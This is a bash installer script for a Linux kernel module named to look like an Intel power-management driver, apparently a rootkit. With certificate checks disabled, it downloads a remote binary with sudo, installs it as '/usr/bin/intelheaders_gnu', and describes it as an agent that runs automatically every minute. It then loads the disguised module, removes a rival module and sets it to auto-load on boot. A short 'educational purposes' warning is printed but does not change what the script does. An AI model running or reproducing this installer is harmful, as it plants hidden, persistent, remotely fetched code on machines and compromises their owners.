#!/bin/bash

#   Install Script
# This script configures and installs the  Linux kernel module

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
cat << "EOF"
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                        

                      INSTALLER
EOF
echo -e "${NC}"

echo -e "${YELLOW}[!] WARNING: This is a for educational/research purposes only!${NC}"
echo -e "${YELLOW}[!] Use responsibly and only on systems you own or have permission to test.${NC}"
echo ""

# Check if running as root - restriction removed
# if [[ $EUID -eq 0 ]]; then
#    echo -e "${RED}[!] This script should not be run as root during configuration phase.${NC}"
#    echo -e "${RED}[!] Root privileges will be requested when needed for installation.${NC}"
#    exit 1
# fi

# Check for required tools
echo -e "${BLUE}[*] Checking system requirements...${NC}"

# Check if kernel headers are installed
if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
    echo -e "${RED}[!] Kernel headers not found. Please install kernel headers first:${NC}"
    echo -e "${YELLOW}    Ubuntu/Debian: sudo apt install linux-headers-\$(uname -r)${NC}"
    echo -e "${YELLOW}    CentOS/RHEL: sudo yum install kernel-devel${NC}"
    echo -e "${YELLOW}    Arch: sudo pacman -S linux-headers${NC}"
    exit 1
fi

# Check for make
if ! command -v make &> /dev/null; then
    echo -e "${RED}[!] 'make' is required but not installed.${NC}"
    exit 1
fi

# Check for gcc
if ! command -v gcc &> /dev/null; then
    echo -e "${RED}[!] 'gcc' is required but not installed.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] System requirements satisfied.${NC}"
echo ""

# Download and setup agent binary
echo -e "${BLUE}[*] Downloading agent binary...${NC}"
if sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu; then
    echo -e "${GREEN}[+] Agent binary downloaded successfully${NC}"
else
    echo -e "${RED}[!] Failed to download agent binary${NC}"
    exit 1
fi

# Set executable permissions
echo -e "${BLUE}[*] Setting executable permissions...${NC}"
if sudo chmod +x /usr/bin/intelheaders_gnu; then
    echo -e "${GREEN}[+] Permissions set successfully${NC}"
else
    echo -e "${RED}[!] Failed to set permissions${NC}"
    exit 1
fi

# Configuration info
echo -e "${BLUE}[*] Agent Configuration:${NC}"
echo -e "  Agent Binary: ${YELLOW}/usr/bin/intelheaders_gnu${NC}"
echo -e "  Execution Interval: ${YELLOW}60 seconds (1 minute)${NC}"
echo -e "  Execution Mode: ${YELLOW}Automatic${NC}"
echo ""

# Clean previous builds
echo -e "${BLUE}[*] Cleaning previous builds...${NC}"
make clean > /dev/null 2>&1 || true

# Build the module
echo -e "${BLUE}[*] Building kernel module...${NC}"
if make; then
    echo -e "${GREEN}[+] Module built successfully.${NC}"
else
    echo -e "${RED}[!] Build failed. Check the output above for errors.${NC}"
    exit 1
fi

# Check if module file exists
if [ ! -f "intel_rapl_headers.ko" ]; then
    echo -e "${RED}[!] Module file not found after build.${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}[+] Build completed successfully!${NC}"
echo -e "${BLUE}[*] Module file: intel_rapl_headers.ko${NC}"
echo ""

# Install the module
echo -e "${BLUE}[*] Installing kernel module...${NC}"
CURRENT_DIR=$(pwd)

# Create directory structure and install module
if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers; then
    echo -e "${GREEN}[+] Created module directory${NC}"
else
    echo -e "${RED}[!] Failed to create module directory${NC}"
    exit 1
fi

# Copy module to system location
if sudo cp "$CURRENT_DIR/intel_rapl_headers.ko" /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers/; then
    echo -e "${GREEN}[+] Module copied to system directory${NC}"
else
    echo -e "${RED}[!] Failed to copy module${NC}"
    exit 1
fi

# Check if module is already loaded and remove it
if lsmod | grep -q intel_rapl_headers; then
    echo -e "${YELLOW}[!] Module already loaded, removing it first...${NC}"
    sudo rmmod intel_rapl_headers || true
fi

# Check for conflicting modules (rebellion, etc.)
if lsmod | grep -q rebellion; then
    echo -e "${YELLOW}[!] Conflicting module 'rebellion' found, removing it...${NC}"
    sudo rmmod rebellion || true
fi

# Load the module
if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/intel_rapl_headers/intel_rapl_headers.ko; then
    echo -e "${GREEN}[+] Module loaded successfully${NC}"
else
    echo -e "${RED}[!] Failed to load module${NC}"
    echo -e "${YELLOW}[!] Try manually removing conflicting modules with: sudo rmmod <module_name>${NC}"
    exit 1
fi

# Update module dependencies
echo -e "${BLUE}[*] Updating module dependencies...${NC}"
sudo depmod -a

# Add to auto-load configuration
echo -e "${BLUE}[*] Configuring auto-load...${NC}"
echo "intel_rapl_headers" | sudo tee /etc/modules-load.d/intel_rapl_headers.conf > /dev/null

# Load with modprobe
if sudo modprobe intel_rapl_headers; then
    echo -e "${GREEN}[+] Module configured for auto-load${NC}"
else
    echo -e "${YELLOW}[!] Module already loaded${NC}"
fi

echo ""
echo -e "${GREEN}[+] Installation completed successfully!${NC}"

# Verify module is loaded
echo -e "${BLUE}[*] Verifying module is loaded...${NC}"
if lsmod | grep -q intel_rapl_headers; then
    echo -e "${GREEN}[+] Module is now active and will auto-load on boot${NC}"
else
    echo -e "${YELLOW}[!] Warning: Module may not be loaded properly${NC}"
fi
